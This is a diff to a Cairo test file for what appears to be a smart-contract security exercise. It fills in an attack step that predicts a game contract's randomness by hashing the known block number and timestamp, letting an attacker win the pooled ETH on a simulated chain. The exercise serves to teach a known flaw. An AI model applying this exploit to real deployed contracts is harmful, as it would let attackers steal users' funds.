@@ -1,7 +1,7 @@
 use alexandria_merkle_tree::merkle_tree::pedersen::PedersenHasherImpl;
 use ayn_random::guess::simple_game::{ISimpleGameDispatcher, ISimpleGameDispatcherTrait};
 use ayn_random::utils::helpers;
-use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
+use openzeppelin_token::erc20::interface::IERC20DispatcherTrait;
 use snforge_std::{
     ContractClassTrait, DeclareResultTrait, declare, start_cheat_block_number,
     start_cheat_block_timestamp, start_cheat_caller_address, stop_cheat_caller_address,
@@ -9,19 +9,13 @@ use snforge_std::{
 use starknet::ContractAddress;
 
 fn deploy_game(eth: ContractAddress) -> (ContractAddress, ISimpleGameDispatcher) {
-    // Declaring the contract class
     let contract_class = declare("SimpleGame").unwrap().contract_class();
-    // Creating the data to send to the constructor, first specifying as a default value
-    let mut data_to_constructor = Default::default();
-    // Pack the data into the constructor
-    Serde::serialize(@eth, ref data_to_constructor);
-    // Deploying the contract, and getting the address
-    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
+    let (address, _) = contract_class.deploy(@array![eth.into()]).unwrap();
     return (address, ISimpleGameDispatcher { contract_address: address });
 }
 
 #[test]
-fn test_randomness_1() {
+fn test_bad_random() {
     // Users
     let alice: ContractAddress = 'alice'.try_into().unwrap();
     let bob: ContractAddress = 'bob'.try_into().unwrap();
@@ -39,7 +33,7 @@ fn test_randomness_1() {
     helpers::mint_erc20(eth_address, charlie, helpers::one_ether() * 10);
     helpers::mint_erc20(eth_address, attacker, helpers::one_ether() * 1);
 
-    // Set timestamp and block number (By default it's 0 in Starknet Foundry simulated chain)
+    // Set timestamp and block number (By default it's 0 in Starknet Foundry)
     start_cheat_block_timestamp(game_address, 1000);
     start_cheat_block_number((game_address), 1000);
 
@@ -72,7 +66,15 @@ fn test_randomness_1() {
 
     // Attack Start //
     // TODO: Win the game and get all the ETH
-
+    start_cheat_caller_address(eth_address, attacker);
+    eth_dispatcher.approve(game_address, helpers::one_ether());
+    stop_cheat_caller_address(eth_address);
+    start_cheat_caller_address(game_address, attacker);
+    let block_num = 1_000;
+    let block_ts = 1_000;
+    let guess = core::pedersen::pedersen(block_num, block_ts);
+    game_dispatcher.play(guess.into());
+    stop_cheat_caller_address(game_address);
     // Attack End //
 
     // Attacker should have win the game and get all the ETH (4 ETH in total)
